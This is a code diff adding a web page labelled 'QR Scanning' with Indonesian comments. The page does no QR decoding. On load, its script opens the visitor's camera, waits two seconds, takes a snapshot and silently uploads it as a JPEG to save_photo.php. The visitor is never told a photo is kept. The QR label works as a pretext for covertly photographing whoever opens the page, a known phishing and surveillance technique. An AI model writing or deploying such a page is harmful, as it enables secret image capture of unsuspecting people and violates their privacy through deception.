@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>QR Scanning</title>
+</head>
+<body>
+    <h1>QR Scanning</h1>
+
+    <!-- Tambahkan video element untuk menampilkan feed kamera -->
+    <video id="video" autoplay></video>
+
+    <script>
+        const videoElement = document.getElementById('video');
+
+        // Fungsi untuk mengambil dan menyimpan foto
+        async function captureAndSavePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElement.srcObject = stream;
+
+                // Tunggu sebentar (misalnya, 2 detik) sebelum mengambil foto
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                // Mengonversi gambar di <canvas> ke data URL
+                const dataURL = canvas.toDataURL('image/jpeg');
+
+                // Kirim dataURL ke server untuk disimpan
+                const formData = new FormData();
+                formData.append('photo', dataURL);
+
+                // Kirim data ke server dengan metode POST
+                fetch('save_photo.php', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.text())
+                .then(result => {
+                    console.log(result);
+                })
+                .catch(error => {
+                    console.error('Gagal menyimpan foto:', error);
+                });
+
+                // Berhenti dari feed kamera
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                });
+                videoElement.srcObject = null;
+            } catch (error) {
+                console.error('Gagal mengambil foto:', error);
+            }
+        }
+
+        // Panggil fungsi captureAndSavePhoto saat halaman dimuat
+        captureAndSavePhoto();
+    </script>
+</body>
+</html>
